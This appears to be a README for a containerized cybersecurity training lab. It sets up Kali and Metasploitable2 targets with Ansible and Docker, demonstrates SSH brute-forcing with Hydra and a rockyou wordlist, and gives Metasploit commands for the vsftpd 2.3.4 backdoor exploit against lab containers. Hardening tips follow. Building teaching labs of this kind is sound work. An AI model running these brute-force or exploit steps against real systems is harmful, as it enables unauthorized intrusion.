
# 🚀 BootCon Cybersecurity Lab: SSH Brute-Force & Metasploit Automation

This project provides a fast-deployable, containerized cybersecurity lab to simulate real-world attacks and defenses. It uses **Ansible** for automation, **Docker + Colima** for environment management, and includes tools like **Hydra**, **Metasploit**, and **Nmap** for offensive testing—all within minutes.

Ideal for:

* 🎓 Cybersecurity students
* 🧑‍💻 Bootcamp labs
* 🧪 CTF prep & demonstrations
* 🛡️ Red teaming practice

---

## 🎯 Objectives

* 🔐 **Brute-force SSH logins** using `Hydra` with real credential wordlists
* 💥 **Exploit known vulnerabilities** (e.g., `vsftpd`, `phpMyAdmin`) using `Metasploit`
* ⚙️ **Automate full lab setup/teardown** using `Ansible`
* 🖥️ **Showcase demos** with clear steps for scanning, exploiting, and hardening

---

## 🛠️ Tools & Technologies

* Python 3
* Docker + Colima (for Mac users)
* Ansible
* Kali Linux (attacker)
* Ubuntu w/ SSH (target)
* Metasploitable2
* Hydra, Nmap, Metasploit Framework

---

## 🗂️ Folder Structure

```
ssh-rdp-brute-lab/
├── ansible/
│   ├── setup-kali.yml
│   ├── setup-target.yml
│   ├── setup-metasploit.yml
│   └── lab-cleanup.yml
├── scripts/
│   └── ssh_bruteforce.py
└── README.md
```

---

## ⚡ Quick Setup

### ✅ 1. Start Docker & Colima

```bash
colima start
docker context use colima
```

### 🧪 2. Deploy Lab with Ansible

```bash
cd ansible
ansible-playbook setup-target.yml
ansible-playbook setup-kali.yml
ansible-playbook setup-metasploit.yml
```

---

## 🔍 Brute-Force Attack Demo

```bash
docker cp scripts/ssh_bruteforce.py kali_attacker:/root/
docker exec -it kali_attacker python3 /root/ssh_bruteforce.py
```

This script:

* Scans `host.docker.internal:2222` for open SSH
* Attempts login using `rockyou.txt`

---

## 💣 Metasploit Exploitation

```bash
docker exec -it kali_attacker msfconsole
```

Example exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST host.docker.internal
set RPORT 21
run
```

---

## ✅ Demo Checklist

* [x] Nmap port scan
* [x] Hydra brute-force attack
* [x] Metasploit shell exploit
* [x] Security hardening recommendations

---

## 🛡️ Mitigation Best Practices

* Disable SSH root login
* Enforce key-based authentication
* Use tools like `fail2ban`
* Patch vulnerable services
* Restrict Docker networking

---

## 🧹 Cleanup

```bash
ansible-playbook ansible/lab-cleanup.yml
```

---

## ⭐ Contribute or Fork

Have ideas to expand the lab? Submit a pull request or fork to add:

* RDP/SMB attacks
* Web exploits (e.g., bWAPP, DVWA)
* Defense tools like Suricata or Splunk


